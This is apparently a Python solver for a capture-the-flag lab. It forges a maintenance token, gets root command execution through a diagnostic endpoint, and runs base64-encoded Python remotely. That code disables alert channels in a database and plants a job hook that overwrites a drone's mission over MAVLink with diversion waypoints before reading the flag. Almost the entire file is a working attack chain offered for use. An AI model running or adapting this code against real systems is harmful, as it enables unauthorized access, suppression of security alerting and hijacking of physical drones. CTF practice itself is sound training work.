#!/usr/bin/env python3
"""Canary / Janus CTF lab solver, based on user-provided write-up.
Run only against your authorized CTF instance.
"""
import argparse
import base64
import hashlib
import json
import re
import shlex
import sys
import time
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    sys.exit('Missing requests: python3 -m pip install requests')

SSO_SECRET = 'EXPURGE'
FLAG = re.compile(r'HLB2026\{[^}\r\n]+\}')

class Solver:
    def __init__(self, args):
        self.args = args
        self.base = args.base.rstrip('/') + '/'
        self.s = requests.Session()
        self.s.headers['User-Agent'] = 'Canary-Janus-CTF-Solver/1.0'
        self.token = hashlib.sha256((SSO_SECRET + '::maintenance').encode()).hexdigest()[:32]

    def get(self, path, **kwargs):
        return self.s.get(urljoin(self.base, path.lstrip('/')), timeout=self.args.timeout, **kwargs)

    def remote(self, command):
        r = self.get('/_internal/diag', params={'action': 'exec', 'cmd': command},
                     headers={'X-Maint-Token': self.token})
        r.raise_for_status()
        return r.text

    def remote_python(self, code):
        encoded = base64.b64encode(code.encode()).decode()
        cmd = "python3 -c " + shlex.quote("import base64;exec(base64.b64decode('" + encoded + "'))")
        return self.remote(cmd)

    def read_status(self):
        raw = self.remote('cat /verdict/status.json')
        print('[STATUS RAW]', raw[:3000].strip())
        match = re.search(r'\{.*\}', raw, re.S)
        if not match:
            return None
        try:
            return json.loads(match.group())
        except json.JSONDecodeError:
            return None

    def telemetry(self):
        r = self.get('/api/telemetry')
        print('[TELEMETRY]', r.status_code, r.text[:2500])
        return r.json() if r.ok else None

    def test_access(self):
        print('[*] Checking HTTP telemetry')
        try:
            self.telemetry()
        except Exception as e:
            print('[!] Telemetry unavailable:', e)
        print('[*] Checking maintenance access')
        result = self.remote('id')
        print('[DIAG]', result.strip()[:1200])
        if 'uid=0(' not in result:
            print('[!] Root access not confirmed; stopping before changes.')
            return False
        return True

    def disable_channels(self):
        # Uses DB credentials and schema described in the write-up.
        code = r'''
import json, os
import psycopg2
conn = psycopg2.connect(host=os.getenv('DB_HOST','db'), dbname=os.getenv('DB_NAME','janus_relay'), user=os.getenv('DB_USER','relay'), password=os.getenv('DB_PASS','<SECRET_EXPURGE>'))
try:
    with conn.cursor() as cur:
        cur.execute('UPDATE alert_channels SET active = FALSE WHERE alert_id = %s', (2,))
        changed_alerts = cur.rowcount
        cur.execute('UPDATE channels SET enabled = FALSE')
        changed_channels = cur.rowcount
        cur.execute('SELECT COUNT(*) FROM alert_channels WHERE active = TRUE')
        remaining = cur.fetchone()[0]
    conn.commit()
    print(json.dumps({'alerts_updated':changed_alerts,'channels_updated':changed_channels,'active_alert_channels':remaining}))
except Exception:
    conn.rollback()
    raise
finally:
    conn.close()
'''
        print('[*] Disabling channels via relay DB')
        print(self.remote_python(code).strip()[:2500])

    def queue_diversion(self):
        # Agent script must run on the simulated field node where pymavlink and drone DNS are available.
        field_script = r'''
import json, time, traceback, urllib.request
from pymavlink import mavutil
agent='NRV-FIELD-042'
report={'agent':agent,'status':'started'}
try:
    m=mavutil.mavlink_connection('udpout:drone:14550',dialect='common',source_system=255,source_component=190)
    hb=m.wait_heartbeat(timeout=8)
    if not hb: raise RuntimeError('No drone heartbeat')
    m.mav.mission_request_list_send(m.target_system,m.target_component)
    current=m.recv_match(type=['MISSION_COUNT'],blocking=True,timeout=8)
    if current is None: raise RuntimeError('No MISSION_COUNT')
    count=int(current.count)
    if count <= 0 or count > 100: raise RuntimeError('Unexpected mission count: %s'%count)
    report['original_count']=count
    m.mav.mission_count_send(m.target_system,m.target_component,count)
    requested=set(); ack=None; deadline=time.monotonic()+35
    while time.monotonic()<deadline:
        msg=m.recv_match(type=['MISSION_REQUEST_INT','MISSION_REQUEST','MISSION_ACK'],blocking=True,timeout=3)
        if msg is None: continue
        typ=msg.get_type()
        if typ=='MISSION_ACK':
            ack=int(msg.type)
            break
        seq=int(msg.seq)
        if seq<0 or seq>=count: raise RuntimeError('Invalid seq %s'%seq)
        if typ=='MISSION_REQUEST_INT':
            m.mav.mission_item_int_send(m.target_system,m.target_component,seq,mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,0,1,0,0,0,0,int(46.045*1e7),int(5.87*1e7),100.0)
        else:
            m.mav.mission_item_send(m.target_system,m.target_component,seq,mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,0,1,0,0,0,0,46.045,5.87,100.0)
        requested.add(seq)
    report.update({'status':'uploaded' if ack==0 else 'unconfirmed','requests':sorted(requested),'ack':ack})
except Exception as e:
    report.update({'status':'error','error':str(e),'trace':traceback.format_exc()[-1000:]})
try:
    data=json.dumps({'agent_id':agent,'version':json.dumps(report,ensure_ascii=True)},ensure_ascii=True).encode()
    req=urllib.request.Request('http://10.96.15.5/api/field/heartbeat',data=data,headers={'Content-Type':'application/json'},method='POST')
    with urllib.request.urlopen(req,timeout=8) as resp: report['heartbeat_http']=resp.status
except Exception as e:
    report['heartbeat_error']=str(e)
print(json.dumps(report))
'''
        encoded = base64.b64encode(field_script.encode()).decode()
        hook = "python3 -c " + shlex.quote("import base64;exec(base64.b64decode('" + encoded + "'))")
        # The agent's job runner consumes JSON files from /opt/webapp/jobs.
        job_code = '''
import json, os, uuid
root='/opt/webapp/jobs'
os.makedirs(root,exist_ok=True)
job_id='job-cargo-'+uuid.uuid4().hex[:10]
job={'id':job_id,'agent':'NRV-FIELD-042','type':'cargo_prep','name':'divert','hook':HOOK,'status':'pending'}
path=os.path.join(root,job_id+'.json')
with open(path,'x') as f: json.dump(job,f)
print(json.dumps({'job_id':job_id,'path':path}))
'''.replace('HOOK',repr(hook))
        print('[*] Queuing field-agent mission diversion')
        print(self.remote_python(job_code).strip()[:3000])

    def get_flag(self):
        result = self.remote('cat /verdict/flag 2>/dev/null || true')
        found = FLAG.search(result)
        if found:
            print('\n[FLAG]', found.group())
            return True
        return False

    def run(self):
        if not self.test_access():
            return 2
        try:
            initial = self.read_status()
            if initial: print('[*] Initial verdict:', initial.get('verdict'), 'remaining:', initial.get('remaining'))
            if self.get_flag(): return 0
            if not self.args.execute:
                print('[*] Read-only mode. Add --execute to change the lab state.')
                return 0
            self.disable_channels()
            self.queue_diversion()
            for attempt in range(self.args.polls):
                print(f'[*] Poll {attempt+1}/{self.args.polls}')
                status = self.read_status()
                if status:
                    print('[*] channels_safe=',status.get('channels_safe'),'drone_safe=',status.get('drone_safe'),'remaining=',status.get('remaining'),'verdict=',status.get('verdict'))
                if self.get_flag(): return 0
                if attempt+1 < self.args.polls:
                    time.sleep(self.args.interval)
            print('[!] Flag not yet available. Re-run with --polls after deadline; do not assume success.')
            return 1
        except (requests.RequestException, ValueError, RuntimeError) as e:
            print('[ERROR]',e)
            return 2


def main():
    p=argparse.ArgumentParser(description='Canary Janus authorized CTF solver')
    p.add_argument('--base',required=True,help='e.g. http://172.28.12.2')
    p.add_argument('--execute',action='store_true',help='Perform state-changing CTF operations')
    p.add_argument('--timeout',type=float,default=12)
    p.add_argument('--polls',type=int,default=3)
    p.add_argument('--interval',type=int,default=15)
    args=p.parse_args()
    return Solver(args).run()

if __name__=='__main__':
    sys.exit(main())
